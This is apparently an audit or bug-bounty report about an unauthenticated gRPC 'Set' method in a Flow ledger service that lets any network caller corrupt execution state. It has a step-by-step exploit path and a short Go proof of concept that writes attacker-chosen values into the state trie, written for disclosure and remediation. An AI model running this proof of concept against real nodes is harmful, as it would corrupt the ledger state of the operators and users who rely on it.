### Title
Unauthenticated `LedgerService/Set` gRPC Method Allows Any Network Caller to Corrupt Execution State - (`ledger/remote/service.go`)

### Summary

The standalone ledger service (`cmd/ledger`) exposes a gRPC `LedgerService/Set` method that permanently mutates the execution state trie. The gRPC server is created with no authentication interceptor, no TLS credentials, and no caller identity check inside the handler. When the service is bound to a TCP address (the documented and example-shown deployment mode), any network-reachable host can call `Set` and write arbitrary key-value pairs into the execution node's ledger, corrupting the canonical execution state.

### Finding Description

**Root cause — no auth on the gRPC server:**

In `cmd/ledger/main.go`, the gRPC server is constructed with only message-size options and no authentication mechanism:

```go
grpcServer := grpc.NewServer(
    grpc.MaxRecvMsgSize(int(*maxRequestSize)),
    grpc.MaxSendMsgSize(int(*maxResponseSize)),
)
``` [1](#0-0) 

No `grpc.Creds()`, no `grpc.UnaryInterceptor()` for auth, and no TLS is applied. The service is then registered and served on a TCP listener:

```go
ledgerService := remote.NewService(ledgerStorage, logger)
ledgerpb.RegisterLedgerServiceServer(grpcServer, ledgerService)
``` [2](#0-1) 

The README and documentation explicitly show `0.0.0.0:9000` as the TCP bind address:

```
./flow-ledger-service -triedir /path/to/trie -ledger-service-tcp 0.0.0.0:9000
``` [3](#0-2) 

**Root cause — no authorization check in the `Set` handler:**

`ledger/remote/service.go`'s `Set` method performs only structural validation (non-nil state, non-empty keys, length match) and then directly calls `s.ledger.Set(update)`, permanently writing to the underlying MTrie/WAL:

```go
func (s *Service) Set(ctx context.Context, req *ledgerpb.SetRequest) (*ledgerpb.SetResponse, error) {
    // only structural checks, no caller identity check
    ...
    newState, trieUpdate, err := s.ledger.Set(update)
    ...
}
``` [4](#0-3) 

The proto definition confirms `Set` is a fully public, unauthenticated RPC:

```proto
rpc Set(SetRequest) returns (SetResponse);
``` [5](#0-4) 

**Exploit path:**

1. Attacker discovers the ledger service TCP port (e.g., `0.0.0.0:9000`).
2. Attacker calls `LedgerService/InitialState` (also unauthenticated) to obtain a valid starting state hash.
3. Attacker sends a `SetRequest` with arbitrary keys and values targeting that state.
4. `Service.Set()` accepts the request, calls `s.ledger.Set(update)`, and the MTrie is permanently mutated with attacker-controlled data.
5. The execution node, which uses this ledger as its state backend, now produces execution results derived from the corrupted trie.

### Impact Explanation

An attacker with TCP access to the ledger service port can write arbitrary key-value pairs into the execution state trie. This causes the execution node to compute incorrect execution results for subsequent blocks, breaking the integrity of the Flow execution layer. Corrupted state propagates to execution receipts, which are verified by Verification nodes and sealed by Consensus nodes — a corrupted state root can cause the entire execution pipeline to diverge or produce invalid sealed results. This is a critical integrity failure in the state transition model.

### Likelihood Explanation

The README documents `0.0.0.0:9000` as the primary TCP deployment example, meaning the service is designed to be network-accessible. Any host on the same network segment (or internet, if not firewalled) that can reach the port can exploit this with a standard gRPC client. No credentials, tokens, or special knowledge beyond the port number are required. The `LedgerService` proto is public and the method signatures are fully documented. [6](#0-5) 

### Recommendation

Add mutual TLS authentication to the gRPC server in `cmd/ledger/main.go`, mirroring the pattern already used by the main node admin server in `cmd/scaffold.go` (`tls.RequireAndVerifyClientCert`). At minimum, add a gRPC unary interceptor that validates the caller's identity before allowing `Set` (and `Prove`) to proceed. Read-only methods (`InitialState`, `HasState`, `Get`, `GetSingleValue`) may be left open if desired, but `Set` must be restricted to the single authorized execution node client. [7](#0-6) 

### Proof of Concept

```go
// Attacker PoC: corrupt execution state via unauthenticated LedgerService/Set
conn, _ := grpc.Dial("0.0.0.0:9000", grpc.WithTransportCredentials(insecure.NewCredentials()))
client := ledgerpb.NewLedgerServiceClient(conn)

// Step 1: get a valid state root (also unauthenticated)
stateResp, _ := client.InitialState(ctx, &emptypb.Empty{})

// Step 2: write attacker-controlled data into the execution state
client.Set(ctx, &ledgerpb.SetRequest{
    State: stateResp.State,
    Keys: []*ledgerpb.Key{{Parts: []*ledgerpb.KeyPart{
        {Type: 0, Value: []byte("owner_account_balance")},
    }}},
    Values: []*ledgerpb.Value{{Data: []byte{0xFF, 0xFF, 0xFF, 0xFF}}},
})
// Execution node now operates on corrupted state
```

// Set updates keys with new values at a specific state and returns the new state
func (s *Service) Set(ctx context.Context, req *ledgerpb.SetRequest) (*ledgerpb.SetResponse, error) {
	if req.State == nil || len(req.State.Hash) != len(ledger.State{}) {
		return nil, status.Error(codes.InvalidArgument, "invalid state")
	}

	if len(req.Keys) == 0 {
		return nil, status.Error(codes.InvalidArgument, "keys cannot be empty")
	}

	if len(req.Keys) != len(req.Values) {
		return nil, status.Error(codes.InvalidArgument, "keys and values length mismatch")
	}

	var state ledger.State
	copy(state[:], req.State.Hash)

	keys := make([]ledger.Key, len(req.Keys))
	for i, protoKey := range req.Keys {
		key, err := protoKeyToLedgerKey(protoKey)
		if err != nil {
			return nil, err // protoKeyToLedgerKey already returns status.Error
		}
		keys[i] = key
	}

	values := make([]ledger.Value, len(req.Values))
	for i, protoValue := range req.Values {
		var value ledger.Value
		// Reconstruct the original value type using is_nil flag
		// This preserves the distinction between nil and []byte{} that protobuf loses
		if len(protoValue.Data) == 0 {
			if protoValue.IsNil {
				// Original value was nil
				value = nil
			} else {
				// Original value was []byte{} (empty slice)
				value = ledger.Value([]byte{})
			}
		} else {
			// Non-empty value, use data as-is
			value = ledger.Value(protoValue.Data)
		}
		values[i] = value
	}

	update, err := ledger.NewUpdate(state, keys, values)
	if err != nil {
		return nil, status.Error(codes.InvalidArgument, err.Error())
	}

	newState, trieUpdate, err := s.ledger.Set(update)
	if err != nil {
		return nil, status.Error(codes.Internal, err.Error())
	}

	// Encode trie update using centralized encoding function to ensure
	// client and server use the same encoding method
	trieUpdateBytes := encodeTrieUpdateForTransport(trieUpdate)

	return &ledgerpb.SetResponse{
		NewState: &ledgerpb.State{
			Hash: newState[:],
		},
		TrieUpdate: trieUpdateBytes,
	}, nil
}
```
